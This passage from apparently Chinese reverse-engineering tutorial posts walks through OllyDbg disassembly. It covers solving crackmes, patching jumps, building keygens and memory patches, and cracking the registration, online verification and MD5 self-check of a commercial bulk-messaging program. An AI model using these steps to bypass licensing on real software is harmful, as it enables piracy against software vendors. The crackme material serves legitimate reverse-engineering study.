  push -0x1\n00418389  |.  E8 AEFEFEFF   call 吾爱破解.0040823C\n0041838E  |.  5E            pop esi                                  ;  00940796\n0041838F  |.  5D            pop ebp                                  ;  00940796\n00418390  |.  C2 0400       retn 0x4\n```\n\n返回上一级函数\n\n```asm\n004029D3  |.  E8 7F590100   call 吾爱破解.00418357                       ;  GetWindowTextA函数所在\n004029D8  |.  8B4D EC       mov ecx,[local.5]                        ;  字符串存进ecx\n004029DB  |.  8B79 F4       mov edi,dword ptr ds:[ecx-0xC]           ;  字符串长度存进edi\n004029DE  |.  85FF          test edi,edi\n004029E0  |.  74 1A         je short 吾爱破解.004029FC                   ;  字符串长度为0跳转\n004029E2  |.  33D2          xor edx,edx                              ;  edx清零\n004029E4  |.  85FF          test edi,edi\n004029E6  |.  7E 14         jle short 吾爱破解.004029FC                  ;  字符串长度小于等于0跳转\n004029E8  |>  85D2          /test edx,edx\n004029EA  |.  78 36         |js short 吾爱破解.00402A22                  ;  结果为负跳转\n004029EC  |.  3BD7          |cmp edx,edi\n004029EE  |.  7F 32         |jg short 吾爱破解.00402A22                  ;  大于跳转\n004029F0  |.  803C0A 2D     |cmp byte ptr ds:[edx+ecx],0x2D          ;  判断字符是否是“-”\n004029F4  |.  75 01         |jnz short 吾爱破解.004029F7                 ;  不是指向下一个字符\n004029F6  |.  46            |inc esi                                 ;  是就+1\n004029F7  |>  42            |inc edx\n004029F8  |.  3BD7          |cmp edx,edi\n004029FA  |.^ 7C EC         \\jl short 吾爱破解.004029E8                  ;  遍历完字符串退出循环\n004029FC  |>  C1E6 04       shl esi,0x4\n004029FF  |.  83EE 02       sub esi,0x2\n00402A02  |.  B8 CDCCCCCC   mov eax,0xCCCCCCCD\n00402A07  |.  F7E6          mul esi\n\t\t\t;\t执行完这条指令后edx的值被覆盖，所以下面的0x18不能看作是字符串长度，字符串长度存储在edi里\n00402A09  |.  C1EA 03       shr edx,0x3                              ;  根据edx右移3位后要等于3，所以3左移3位等于0x18\n00402A0C  |.  BE FFFFFFFF   mov esi,-0x1                  \n00402A11  |.  83EA 03       sub edx,0x3                              ;  根据下面跳转判断edx=3\n00402A14  |.  0F85 C8020000 jnz 吾爱破解.00402CE2                        ;  不为0跳转，这里跳转绕过注册成功\n00402A1A  |.  85FF          test edi,edi\n00402A1C  |.  7F 0E         jg short 吾爱破解.00402A2C\n00402A1E  |.  0BF6          or esi,esi\n00402A20  |.  EB 23         jmp short 吾爱破解.00402A45\n00402A22  |>  68 57000780   push 0x80070057\n00402A27  |.  E8 C4E9FFFF   call 吾爱破解.004013F0\n00402A2C  |>  6A 2D         push 0x2D\n00402A2E  |.  51            push ecx\n00402A2F  |.  E8 D4921100   call 吾爱破解.0051BD08\n```\n\n进一步分析这几条指令：\n\n```asm\n004029FC  |> \\C1E6 04       shl esi,0x4                              ;  从下面逆推0x20右移4位为2，所以“-”的个数为2\n004029FF  |.  83EE 02       sub esi,0x2                              ;  要使下面的edx=0x18,这里esi=0x1E+2=0x20才对\n\t\t ;  esi=18 66666666除以CCCCCCCD=0X1E\n00402A02  |.  B8 CDCCCCCC   mov eax,0xCCCCCCCD                       ;  eax=CCCCCCCD\n00402A07  |.  F7E6          mul esi                                  ;  edx拼接eax=esi*eax要等于00000018 66666666\n00402A09  |.  C1EA 03       shr edx,0x3                              ;  根据edx右移3位后要等于3，所以3左移3位等于0x18\n```\n\n懂了，所以字符串中需要两个“-”号。输入`1234567-89012345-6789012`试试(“-”号位置任意)。\n\n{% asset_img -.png 输入字符串 %}\n\n发现注册成功。注册成功后会在目录下生成.txt，.ini文件，写入注册表。\n\n```\n52pojie.txt\n1234567\n\n52pojie.ini\n[验证]\nKey=89012345\n\n注册表\n6789012\n```\n\n从上面的分析中已经知道.txt文件的注册码是`ITN3UXJGJ`，改了再说，这里是9个字符。这时再下断`GetPrivateProfileStringA`函数，程序就会经过这个算法。此时就可以分析算法了。\n\n```asm\n00402198  |.  FF15 1C345400 call dword ptr ds:[<&KERNEL32.GetPrivate>; \\GetPrivateProfileStringA\n0040219E  |.  5E            pop esi\n0040219F  |.  85C0          test eax,eax                             ;  ini文件的字符串长度\n004021A1  |.  74 4D         je short 吾爱破解.004021F0                   ;  字符串长度为0跳转\n004021A3  |.  8D8D F4FEFFFF lea ecx,[local.67]                       ;  ecx等于字符串\n004021A9  |.  8D51 01       lea edx,dword ptr ds:[ecx+0x1]\n004021AC  |.  8D6424 00     lea esp,dword ptr ss:[esp]\n004021B0  |>  8A01          /mov al,byte ptr ds:[ecx]\n004021B2  |.  41            |inc ecx                                 ;  指针+1指向下个字符\n004021B3  |.  84C0          |test al,al\n004021B5  |.^ 75 F9         \\jnz short 吾爱破解.004021B0                 ;  遍历字符串\n004021B7  |.  2BCA          sub ecx,edx                              ;  ecx存进字符串长度\n004021B9  |.  83F9 0E       cmp ecx,0xE                              ;  ini文件中字符串长度为14\n004021BC  |.  75 32         jnz short 吾爱破解.004021F0\n004021BE  |.  33C0          xor eax,eax                              ;  eax清零\n004021C0  |>  0FB69405 E4FE>/movzx edx,byte ptr ss:[ebp+eax-0x11C]   ;  将真正的注册码存入edx\n004021C8  |.  0FBE8C05 F4FE>|movsx ecx,byte ptr ss:[ebp+eax-0x10C]   ;  将输入的字符串存入ecx\n004021D0  |.  83C2 30       |add edx,0x30                            ;  将真正的注册码+0x30\n004021D3  |.  3BD1          |cmp edx,ecx                             ;  与输入的字符串对比\n004021D5  |.  75 19         |jnz short 吾爱破解.004021F0\n004021D7  |.  40            |inc eax\n004021D8  |.  83F8 0E       |cmp eax,0xE\n004021DB  |.^ 72 E3         \\jb short 吾爱破解.004021C0\n```\n\n在数据窗口Ctrl+G输入`ebp+eax-0x11c`，第1行就是真正的注册码，第2行是输入的字符串。\n\n```asm\n0012F33C  3A 1E 02 25 28 1A 48 15 3A 1D 02 25 28 1A 00 00  :\u001e\u0002%(\u001aH\u0015:\u001d\u0002%(\u001a..\n0012F34C  38 39 30 31 34 35 36 37 38 39 30 31 32 31 00 00  89014567890121..\n```\n\n将真正的注册码+0x30就是我们要输入的字符串`jN2UXJxEjM2UXJ`。\n\n```asm\n6A 4E 32 55 58 4A 78 45 6A 4D 32 55 58 4A\n```\n\n将目录下的.ini文件信息修改为以上字符串。\n\n注册表部分。在反汇编窗口右键->查找->所有模块间的调用，搜索`RegQueryValueExA`函数，右键->在每个调用到`RegQueryValueExA`上设置断点。找到有比较算法那个，分析。\n\n```asm\n00402285  |.  FF15 24305400 call dword ptr ds:[<&ADVAPI32.RegQueryVa>; \\RegQueryValueExA\n0040228B  |.  85C0          test eax,eax\n0040228D  |.  0F85 E1000000 jnz 吾爱破解.00402374\n00402293  |.  8D8D F4FEFFFF lea ecx,[local.67]                       ;  输入的字符串\n00402299  |.  8D51 01       lea edx,dword ptr ds:[ecx+0x1]\n0040229C  |.  8D6424 00     lea esp,dword ptr ss:[esp]\n004022A0  |>  8A01          /mov al,byte ptr ds:[ecx]\n004022A2  |.  41            |inc ecx\n004022A3  |.  84C0          |test al,al\n004022A5  |.^ 75 F9         \\jnz short 吾爱破解.004022A0                 ;  遍历字符串\n004022A7  |.  2BCA          sub ecx,edx                              ;  ecx=字符串长度=9\n004022A9  |.  83C1 06       add ecx,0x6                              ;  所以ecx=字符串长度+6=0xF\n004022AC  |.  B8 CDCCCCCC   mov eax,0xCCCCCCCD                       ;  eax=CCCCCCCD\n004022B1  |.  F7E1          mul ecx                                  ;  要使得edx拼接eax=ecx*eax=C 33333336\n004022B3  |.  C1EA 02       shr edx,0x2                              ;  edx=0x0C\n004022B6  |.  83EA 03       sub edx,0x3                              ;  edx=0x3\n004022B9  |.  0F85 B5000000 jnz 吾爱破解.00402374                        ;  退出函数，不能跳\n004022BF  |.  E8 D82D0000       call 吾爱破解.0040509C\n```\n\n所以注册表的注册码是9个字符，修改修改再继续。\n\n```asm\n004022BF  |.  E8 D82D0000       call 吾爱破解.0040509C                       ;  mov eax=lJT\n004022C4  |.  8BC8              mov ecx,eax\n004022C6  |.  85C9              test ecx,ecx\n004022C8  |.  0F84 C3000000     je 吾爱破解.00402391\n004022CE  |.  8B01              mov eax,dword ptr ds:[ecx]               ;  eax=lJT.\n004022D0  |.  FF50 0C           call dword ptr ds:[eax+0xC]              ;  eax指向地址58E5E0,也就是lJT.的下一地址\n004022D3  |.  8A95 F8FEFFFF     mov dl,byte ptr ss:[ebp-0x108]           ;  dl指向输入的字符第五个字符的地址\n004022D9  |.  8D70 10           lea esi,dword ptr ds:[eax+0x10]          ;  esi=58e5f0\n004022DC  |.  0FBE85 F4FEFFFF   movsx eax,byte ptr ss:[ebp-0x10C]        ;  eax=字符串的第1个字符\n004022E3  |.  0FBECA            movsx ecx,dl                             ;  ecx=字符串的第5个字符\n004022E6  |.  48                dec eax                                  ;  eax=eax-1\n004022E7  |.  89B5 E4FEFFFF     mov [local.71],esi                       ;  吾爱破解.0058E5F0\n004022ED  |.  3BC1              cmp eax,ecx                              ;  str[0]-1==str[4]\n004022EF  |.  75 69             jnz short 吾爱破解.0040235A                  ;  不能跳\n```\n\n字符串中第1个字符要比第5个字符大1，修改修改继续。\n\n```asm\n004022F1  |.  0FBE85 FCFEFFFF   movsx eax,byte ptr ss:[ebp-0x104]        ;  eax=输入的第9个字符\n004022F8  |.  83C1 02           add ecx,0x2\n004022FB  |.  3BC8              cmp ecx,eax                              ;  str[8]==str[4]+2\n004022FD  |.  75 5B             jnz short 吾爱破解.0040235A\n```\n\n字符串中第9个字符要比第5个字符大2，修改修改继续。\n\n```asm\n004022FF  |.  80F2 54           xor dl,0x54                              ;  dl是第5个字符\n00402302  |.  80FA 66           cmp dl,0x66                              ;  第5个字符与0x54异或要等于0x66\n00402305  |.  75 53             jnz short 吾爱破解.0040235A\n```\n\n所以第5个字符是0x32('2')，也可以推算出，第1个字符是'3'，第9个字符是'4'。修改修改再继续。push了3个参数，第一个参数是长度，第二个参数是\"MjM\"，第三个参数是字符串的第2个字符的地址。猜测这个函数是比较2-4位是否为\"MjM\"。\n\n```asm\n00402307  |.  6A 03             push 0x3\n00402309  |.  8D85 F5FEFFFF     lea eax,dword ptr ss:[ebp-0x10B]         ;  eax=字符串的第2个字符地址\n0040230F  |.  68 3C465400       push 吾爱破解.0054463C                       ;  MjM\n00402314  |.  50                push eax\n00402315  |.  E8 76991100       call 吾爱破解.0051BC90\n0040231A  |.  83C4 0C           add esp,0xC\n0040231D  |.  85C0              test eax,eax\n0040231F  |.  75 39             jnz short 吾爱破解.0040235A\n```\n\n修改一下试试。跳转没有实现，猜测正确。下面是一样的步骤。\n\n```asm\n00402321  |.  6A 03             push 0x3\n00402323  |.  8D85 F9FEFFFF     lea eax,dword ptr ss:[ebp-0x107]         ;  eax=第6个字符地址\n00402329  |.  68 40465400       push 吾爱破解.00544640                       ;  UXJ\n0040232E  |.  50                push eax\n0040232F  |.  E8 5C991100       call 吾爱破解.0051BC90\n00402334  |.  83C4 0C           add esp,0xC\n00402337  |.  85C0              test eax,eax\n00402339  |.  75 1F             jnz short 吾爱破解.0040235A\n```\n\n综上，注册表的注册码为`3MjM2UXJ4`。\n\n完整注册码为`ITN3UXJGJ-jN2UXJxEjM2UXJ-3MjM2UXJ4`，得到彩蛋。\n\n{% asset_img 彩蛋2.png 彩蛋2 %}\n\n{% asset_img 我是彩蛋.png 彩蛋2 %}\n\n点击“我是彩蛋”有一连串的弹窗提示。这些弹窗语句早在我们搜索字符串的时候就已经看到了。\n\n{% asset_img 搜索字符串2.png 搜索字符串 %}\n\nKey1=ITN3UXJGJ-jN2UXJxEjM2UXJ-3MjM2UXJ4\n\nKey2_1=4JXU2MjM3-JXU2MjExJXU2Nj-JGJXU3NTl\n\nKey2_2=3MjM2UXJ4-jN2UXJxEjM2UXJ-ITN3UXJGJ\n\nKey2_3=JGJXU3NTl-JXU2MjExJXU2Nj-4JXU2MjM3\n\nKey2的所有数字之和长度之间的差为4，且比长度大。所以彩蛋Key长度为12。\n\nKey的倒数第二位为2，最后一位为=。Key=00000000002=\n\nKey的第一位是什么呢？B，我们经常说的，NB！Key=N0000000002=\n\nKey的倒数第三位是Key2的第三位？J、j、X？\n\nKey的第二位为管理员名字的首字母，管理员是Hmily，所以是H，Key=NH000000002=\n\nKey的第三位和第九位一样，都是第五位的小写字母。\n\n好难猜啊...我看到答案是NHlkLXpdIU2=，但完全不知道怎么得来的。\n\n# 5. 给程序打补丁\n\n吾爱破解内存补丁生成器V1.00：做程序补丁\n\nKeyMake V2.0 修改版：做内存注册机\n\n{% asset_img 注册失败.png 注册失败 %}\n\n拉进OD，查找敏感字符串。\n\n```asm\n0040342B  |. /75 07         jnz short 第六课例.00403434\n0040342D  |. |68 78E15700   push 第六课例.0057E178                       ;  注册成功\n00403432  |. |EB 10         jmp short 第六课例.00403444\n00403434  |> \\68 84E15700   push 第六课例.0057E184                       ;  注册失败\n00403439  |.  EB 09         jmp short 第六课例.00403444\n0040343B  |>  6A 00         push 0x0\n0040343D  |.  6A 00         push 0x0\n0040343F  |.  68 6CE15700   push 第六课例.0057E16C                       ;  输入为空\n00403444  |>  E8 67080100   call 第六课例.00413CB0\n```\n\n爆破补丁版：将地址为`40342B`的`jnz`直接修改为`jz`或`nop`即可。\n\n那如果使用吾爱破解内存补丁生成器V1.00爆破要怎么操作呢？找到需要修改的地址后，打开补丁生成器，将程序拖入补丁生成器中，输入内存地址和需要修改成什么指令，添加指令，导出补丁。\n\n{% asset_img 补丁.png 打补丁 %}\n\n关闭OD后打开补丁程序，点击“开始补丁”就会自动运行补丁程序，此时输入什么都可以注册成功了。\n\n{% asset_img 补丁成功.png 打补丁 %}\n\n注册机版：向上划到段首下断运行，F8单步到此处。寄存器窗口和堆栈窗口都可看到真正的注册码。\n\n```asm\n00403400  |> /8A10          /mov dl,byte ptr ds:[eax]                ;  eax指向真正的注册码\n00403402  |. |3A11          |cmp dl,byte ptr ds:[ecx]                ;  ecx指向输入的注册码\n00403404  |. |75 1A         |jnz short 第六课例.00403420\n00403406  |. |84D2          |test dl,dl\n00403408  |. |74 12         |je short 第六课例.0040341C\n0040340A  |. |8A50 01       |mov dl,byte ptr ds:[eax+0x1]\n0040340D  |. |3A51 01       |cmp dl,byte ptr ds:[ecx+0x1]\n00403410  |. |75 0E         |jnz short 第六课例.00403420\n00403412  |. |83C0 02       |add eax,0x2\n00403415  |. |83C1 02       |add ecx,0x2\n00403418  |. |84D2          |test dl,dl\n0040341A  |.^\\75 E4         \\jnz short 第六课例.00403400\n```\n\n```asm\n0012F6EC   186B4420\n0012F6F0   00000111\n0012F6F4   00000000\n0012F6F8   00194078  ASCII \"202CB962AC59075B964B07152D234B70\"\n0012F6FC   00194078  ASCII \"202CB962AC59075B964B07152D234B70\"\n0012F700   00192828  ASCII \"852\"\n0012F704   001927B8  ASCII \"123\"\n```\n\n记下运行到`403400`，真正的注册码存在了寄存器窗口的eax的值(注册码字符串的首地址)里。\n\n打开Keymake，其它->内存注册机，将需要制作注册机的程序加载进来，添加。编辑信息->添加->生成。\n\n{% asset_img 注册机.png 注册机 %}\n\n运行注册机，发现需要两个框都填了才能给注册码，否则提示“输入为空”。为了美观，也可将`004033A7`的跳转指令nop掉。\n\n```asm\n00403384  |.  50            push eax                                 ;  将用户名入栈\n00403385  |.  8D8F 30010000 lea ecx,dword ptr ds:[edi+0x130]\n0040338B  |.  E8 12630100   call 第六课例.004196A2\n00403390  |.  8B45 EC       mov eax,[local.5]                        ;  eax=用户名\n00403393  |.  83CF FF       or edi,-0x1\n00403396  |.  8378 F4 00    cmp dword ptr ds:[eax-0xC],0x0\n0040339A  |.  0F84 9B000000 je 第六课例.0040343B                         ;  用户名为空跳转\n004033A0  |.  8B45 E8       mov eax,[local.6]\n004033A3  |.  8378 F4 00    cmp dword ptr ds:[eax-0xC],0x0\n004033A7  |.  0F84 8E000000 je 第六课例.0040343B                         ;  注册码为空跳转\n```\n\nnop掉后再生成注册机。虽然不会提示“输入为空”，但也会提示“注册失败”字样，暂时没有什么好的办法，就这样吧。(提示“输入为空”比“注册失败”要好，还是别改了吧)\n\n{% asset_img 注册码2.png 注册码 %}\n\n也可以用Keymake制作内存补丁，[Shark恒 制作内存补丁](https://www.bilibili.com/video/BV1cw411Z7Ab?p=22) 。\n\n# 6. 打补丁作业\n\n程序加了VMProtect壳。VMProtect 是软件保护系统，将保护后的代码放到虚拟机中运行，这将使分析反编译后的代码和破解变得极为困难。这个我目前还不会手脱，那就在有壳的基础上修改吧。\n\nF9运行程序跑起来，进入OD的`E`模块，双击进入程序代码块(.exe)。取消分析，智能搜索发现字符串都能看到了。搜索敏感字符串进入反汇编代码，还是熟悉的位置。\n\n```asm\n0040346B   /75 07           jnz short 吾爱破解.00403474\n0040346D   |68 80E15700     push 吾爱破解.0057E180                       ; 注册成功\n00403472   |EB 10           jmp short 吾爱破解.00403484\n00403474   \\68 8CE15700     push 吾爱破解.0057E18C                       ; 注册失败\n00403479    EB 09           jmp short 吾爱破解.00403484\n0040347B    6A 00           push 0x0\n0040347D    6A 00           push 0x0\n0040347F    68 6CE15700     push 吾爱破解.0057E16C                       ; 输入为空\n00403484    E8 78080100     call 吾爱破解.00413D01\n```\n\n爆破补丁版：\n\n但发现这样nop后保存文件会提示“无法定位数据”。\n\n{% asset_img 无法定位数据.png 无法定位数据 %}\n\n这时就需要吾爱破解内存补丁生成器V1.00了。`jnz`的机器码为0x75，`je`指令为0x74，`nop`的机器码为0x90。关闭OD再运行补丁。\n\n注册机版：\n\n由于程序有壳，无法重新载入，但还是可以在这个函数中一步步运行程序到算法处，按照5的方法生成注册机即可。\n\n```asm\n00403440  |>  8A10          /mov dl,byte ptr ds:[eax];真正注册码\n00403442  |. |3A11          |cmp dl,byte ptr ds:[ecx];输入的字符串\n00403444  |. |75 1A         |jnz short 吾爱破解.00403460\n00403446  |. |84D2          |test dl,dl\n00403448  |. |74 12         |je short 吾爱破解.0040345C\n0040344A  |. |8A50 01       |mov dl,byte ptr ds:[eax+0x1]\n0040344D  |. |3A51 01       |cmp dl,byte ptr ds:[ecx+0x1]\n00403450  |. |75 0E         |jnz short 吾爱破解.00403460\n00403452  |. |83C0 02       |add eax,0x2\n00403455  |. |83C1 02       |add ecx,0x2\n00403458  |. |84D2          |test dl,dl\n0040345A  |.^\\75 E4         \\jnz short 吾爱破解.00403440\n```\n\n分析算法：\n\n在段首下断，输入用户名和注册码后运行，程序停在断点处。F8一步步跟，分析每一步程序做了什么。执行完`4033BF`地址的指令后，可以看到堆栈窗口中用户名和“123456”拼接在一起。\n\n{% asset_img 连接字符串.png 连接字符串 %}\n\n执行完`4033FE`地址的指令后，堆栈窗口出现真正的注册码。\n\n{% asset_img 生成注册码.png 真正的注册码 %}\n\n那我们进去看看它是怎么生成的。看到这一大段就应该意识到这是MD5的初始化处理。\n\n```asm\n00401B55    C745 D8 0000000>mov dword ptr ss:[ebp-0x28],0x0\n00401B5C    C745 D4 0000000>mov dword ptr ss:[ebp-0x2C],0x0\n00401B63    C745 DC 0123456>mov dword ptr ss:[ebp-0x24],0x67452301\n00401B6A    C745 E0 89ABCDE>mov dword ptr ss:[ebp-0x20],0xEFCDAB89\n00401B71    C745 E4 FEDCBA9>mov dword ptr ss:[ebp-0x1C],0x98BADCFE\n00401B78    C745 E8 7654321>mov dword ptr ss:[ebp-0x18],0x10325476\n00401B7F    C645 FC 02      mov byte ptr ss:[ebp-0x4],0x2\n00401B83    8B45 08         mov eax,dword ptr ss:[ebp+0x8]\n00401B86    8B70 F4         mov esi,dword ptr ds:[eax-0xC]\n```\n\n传入的参数是用户名和“123456”拼接，所以密码是MD5(用户名+\"123456\")。","categories":["Windows逆向"],"tags":["OllyDbg","吾爱破解培训"]},{"title":"第四课——去程序自校验","url":"/posts/65ab04eb.html","content":"\n破解豪迪群发器。\n\n打开注册页面，随便输入注册码，会出现以下：\n\n<!--more-->\n\n{% asset_img 豪迪注册.jpg 豪迪注册 %}\n\n程序无壳，直接破解。右键->中文搜索引擎->智能搜索。找到“已注册版本”，应该是主页页面中央的红字部分。点进去，发现上面有比较和跳转指令。在跳转指令处下断，运行程序，点击注册，发现程序停在断点处，说明找对地方了。这个对比语句比较的是`0x579F24`这个所指向的全局变量。\n\n```asm\n00541870  |.  803D 249F5700>cmp byte ptr ds:[0x579F24],0x0\n00541877  |.  74 10         je short qqqf.00541889\n00541879  |.  BA F4185400   mov edx,qqqf.005418F4                    ;  已注册版本\n```\n\n右键->查找->所有常量，输入`0x579F24`。OD跳到所有调用过`0x579F24`的指令，右键->在每个命令上设置断点。快速定位第一个赋值点。\n\n```asm\n参考位于 qqqf:CODE 到常量 0x579F24\n地址       反汇编                                    注释\n0054135F   mov byte ptr ds:[0x579F24],0x0            ds:[00579F24]=00\n00541366   cmp byte ptr ds:[0x579F24],0x0            ds:[00579F24]=00\n0054147C   mov byte ptr ds:[0x579F24],0x0            ds:[00579F24]=00\n00541650   mov byte ptr ds:[0x579F24],dl\n0054169E   mov byte ptr ds:[0x579F24],al\n005416A3   cmp byte ptr ds:[0x579F24],0x0            ds:[00579F24]=00\n00541870   cmp byte ptr ds:[0x579F24],0x0            ds:[00579F24]=00\n0056AFB0   push ebp                                  (初始 CPU 选择)\n```\n\n重载，去到第一个断点处。\n\n```asm\n0054163B   .  E8 842FECFF   call qqqf.004045C4\n00541640   .  83F8 18       cmp eax,0x18\n00541643   .  74 09         je short qqqf.0054164E;eax=0x18则给dl赋值为1\n00541645   .  83F8 0C       cmp eax,0xC\n00541648   .  74 04         je short qqqf.0054164E;eax=0xC也可以给dl赋值为1\n0054164A   .  33D2          xor edx,edx;eax不等于0x18或0xc则给dl赋值为0\n0054164C   .  EB 02         jmp short qqqf.00541650\n0054164E   >  B2 01         mov dl,0x1\n00541650   >  8815 249F5700 mov byte ptr ds:[0x579F24],dl;第一个断点处，将dl的值赋给它\n00541656   .  83F8 0C       cmp eax,0xC\n00541659   .  75 48         jnz short qqqf.005416A3;如果eax不等于0xC则跳转\n```\n\n首先假设eax=0x18(在注册页面上输入0x18位注册码)的情况，即最后一个跳转指令要跳转。\n\n```asm\n005416A3   > \\803D 249F5700>cmp byte ptr ds:[0x579F24],0x0\n005416AA   .  75 05         jnz short qqqf.005416B1;跳转实现\n```\n\nShift+F9运行，去到第二个断点处。\n\n```asm\n0054135A  |.  83F8 0C       cmp eax,0xC\n0054135D  |.  74 07         je short qqqf.00541366;eax=0xC跳转，否则会执行赋0语句\n0054135F  |.  C605 249F5700>mov byte ptr ds:[0x579F24],0x0\n00541366  |>  803D 249F5700>cmp byte ptr ds:[0x579F24],0x0\n```\n\nShift+F9运行，继续去到第三个断点处。\n\n```asm\n00541870  |.  803D 249F5700>cmp byte ptr ds:[0x579F24],0x0\n00541877  |.  74 10         je short qqqf.00541889;eax=0x18时会执行赋0语句，所以会跳过“已注册版本”\n00541879  |.  BA F4185400   mov edx,qqqf.005418F4                    ;  已注册版本\n0054187E  |.  8B83 FC020000 mov eax,dword ptr ds:[ebx+0x2FC]\n00541884  |.  E8 F77CFBFF   call qqqf.004F9580\n00541889  |>  33C0          xor eax,eax\n```\n\n重载OD，在注册页面上输入0xC位注册码，运行。第一个断点没问题，去到第二个断点处(此时这第二个断点与上次输入0x18的第二个断点已经不一样了)。\n\n```asm\n00541696   . /7F 04                 jg short qqqf.0054169C\n00541698   > |33C0                  xor eax,eax\n0054169A   . |EB 02                 jmp short qqqf.0054169E\n0054169C   > \\B0 01                 mov al,0x1\n0054169E      A2 249F5700           mov byte ptr ds:[0x579F24],al;此时al的值为0\n005416A3      803D 249F5700 00      cmp byte ptr ds:[0x579F24],0x0\n005416AA      75 05                 jnz short qqqf.005416B1;这里一定让它跳转，否则注册失败\n```\n\n修改第一行的跳转指令，使al为1。\n\n```asm\njg short qqqf.0054169C\t\t=>\tjmp short qqqf.0054169C\n```\n\n保存一下，载入新程序再下断运行，发现运行到`54169E`时al还是为0。\n\n```asm\n0054168C     /75 0A         jnz short qqqf1.00541698\n0054168E   . |8B07          mov eax,dword ptr ds:[edi]\n00541690   . |E8 177EFCFF   call qqqf1.005094AC\n00541695   . |40            inc eax\n00541696   . |EB 04         jmp short qqqf1.0054169C;修改过\n00541698   > \\33C0          xor eax,eax\n0054169A   .  EB 02         jmp short qqqf1.0054169E\n0054169C   >  B0 01         mov al,0x1\n0054169E   >  A2 249F5700   mov byte ptr ds:[0x579F24],al\n005416A3   >  803D 249F5700>cmp byte ptr ds:[0x579F24],0x0\n```\n\n猜测`54168C`的跳转指令绕过了我们刚才修改过的指令，再`54168C`处下断，重载，运行到这里果然跳转实现了。那将`54168C`改为nop，让它执行`541696`使al为1。\n\n保存，运行一下，发现左下角显示“已注册！”，接着显示“正在验证...”，“验证失败！”。\n\n{% asset_img 验证.jpg 验证失败 %}\n\n载入OD，查找字符串“验证失败！”处，查看上下代码：\n\n```asm\n00540B2A  |> \\807D EB 00    cmp byte ptr ss:[ebp-0x15],0x0\n00540B2E  |.  75 68         jnz short qqqf2.00540B98\n00540B30  |.  B8 E00E5400   mov eax,qqqf2.00540EE0                   ;  验证失败！\n00540B35  |.  E8 3ED00100   call qqqf2.0055DB78\n```\n\n尝试将跳转指令修改一下。\n\n```asm\njnz short qqqf2.00540B98\t=>\t\tjmp short qqqf2.00540B98\n```\n\nF9运行发现经过验证后显示“已注册！”字样，说明验证成功。而且点击注册那里也显示“已注册版本”。\n\n由于每次等待验证的时间都非常长，所以也可以直接在函数段首`retn`，绕过验证过程。\n\n当运用“插入文件”、“插入其他”、“插入图片”功能时，都显示乱码。反正就是很多功能都不能用。\n\n{% asset_img 插入其他.jpg 插入其他 %}\n\n这就涉及到程序自校验的问题。这个程序是什么类型的自校验呢？将原程序拉进WinHEX，在程序末尾填充00的任意一个地方修改为01保存，使用以上功能时还是乱码，很有可能是MD5自校验。\n\n从 https://www.52pojie.cn/thread-14986-1-1.html 下载脱壳脚本。将已注册版本的程序载入OD，插件->ODbgScript->打开，选择脱壳脚本里的各语言按钮事件->Delphi & VB事件断点查找脚本。可以在`B`模块看到自动下了很多断点。Shift+F9运行起来，在程序界面点击“插入其他”，OD停在某断点处。因为还没有显示下拉菜单，更别提是自校验的过程了，所以这个断点可以去掉。\n\n```asm\n00479DF4  |.  FF93 20010000 call dword ptr ds:[ebx+0x120]            ;  qqqf3_1.0056934C\n```\n\nF9运行，在程序界面点击插入其他->插入随机字母，OD停在下个断点处。这个函数才是触发自校验过程的函数。\n\n```asm\n0048B2D6   .  FF93 88000000 call dword ptr ds:[ebx+0x88]             ;  qqqf3_1.00567ED8\n```\n\nF7跟进去。这个函数里也有挺多个call指令，到底哪个是MD5自校验函数呢？我们知道，MD5自校验需要读取文件来计算MD5值，所以如果在call里面看到有关文件的API函数，很大可能这个函数是MD5自校验的关键函数。\n\n```asm\n00567ED8  /.  55            push ebp\n00567ED9  |.  8BEC          mov ebp,esp\n00567EDB  |.  6A 00         push 0x0\n00567EDD  |.  6A 00         push 0x0\n00567EDF  |.  33C0          xor eax,eax\n00567EE1  |.  55            push ebp\n00567EE2  |.  68 347F5600   push qqqf3_1.00567F34\n00567EE7  |.  64:FF30       push dword ptr fs:[eax]\n00567EEA  |.  64:8920       mov dword ptr fs:[eax],esp\n00567EED  |.  8D4D F8       lea ecx,[local.2]\n00567EF0  |.  33D2          xor edx,edx\n00567EF2  |.  B8 1E000000   mov eax,0x1E\n00567EF7  |.  E8 C4AEF4FF   call qqqf3_1.004B2DC0\n00567EFC  |.  8B55 F8       mov edx,[local.2]\n00567EFF  |.  8D45 FC       lea eax,[local.1]\n00567F02  |.  E8 D1CCE9FF   call qqqf3_1.00404BD8\n00567F07  |.  8B45 FC       mov eax,[local.1]\n00567F0A  |.  50            push eax\n00567F0B  |.  E8 5049FFFF   call qqqf3_1.0055C860\n00567F10  |.  5A            pop edx                                  ;  qqqf3_1.0048B2DC\n00567F11  |.  E8 9AF9F8FF   call qqqf3_1.004F78B0\n00567F16  |.  33C0          xor eax,eax\n00567F18  |.  5A            pop edx                                  ;  qqqf3_1.0048B2DC\n00567F19  |.  59            pop ecx                                  ;  qqqf3_1.0048B2DC\n00567F1A  |.  59            pop ecx                                  ;  qqqf3_1.0048B2DC\n00567F1B  |.  64:8910       mov dword ptr fs:[eax],edx\n00567F1E  |.  68 3B7F5600   push qqqf3_1.00567F3B\n00567F23  |>  8D45 F8       lea eax,[local.2]\n00567F26  |.  E8 ADC3E9FF   call qqqf3_1.004042D8\n00567F2B  |.  8D45 FC       lea eax,[local.1]\n00567F2E  |.  E8 DDCAE9FF   call qqqf3_1.00404A10\n00567F33  \\.  C3            retn\n```\n\n一个一个点击回车跟随call指令进去看看，后面的那几个call要不就是没有call指令要不就是无关文件的API函数，都可以不管。`00567EF7`地址的call指令，进去的第二个call的第一个call，看到`GetModuleFileNameA`函数，所以`00567EF7`的函数调用是自校验的关键函数。在`GetModuleFileNameA`函数下断运行。`GetModuleFileNameA`函数的意思是获取当前进程已加载模块的完整路径，该模块必须由当前进程加载。\n\n继续F8单步，运行到此处时，可以看到eax显示`C:\\Program Files\\QQSendFriend\\Desklog.dll`。\n\n```asm\n004B2E1A  |.  E8 856FF5FF   call qqqf3_1.00409DA4\n```\n\nF7跟进去，发现这个函数是用来创建`Desklog.dll`文件的。再看下个函数：\n\n```asm\n004B2E27  |.  E8 14E2FFFF   call qqqf3_1.004B1040\n```\n\n跟进去，第一个call指令里有个`SetFilePointer`函数，在一个文件中设置新的读取位置。第二个call指令里有个`ReadFile`函数。第三个又是`SetFilePointer`函数，跳出循环，第四个又是`ReadFile`函数等等。但运行完整个`4B1040`函数程序都没有返回火星文。那继续往下看：\n\n```asm\n004B2E27  |.  E8 14E2FFFF   call 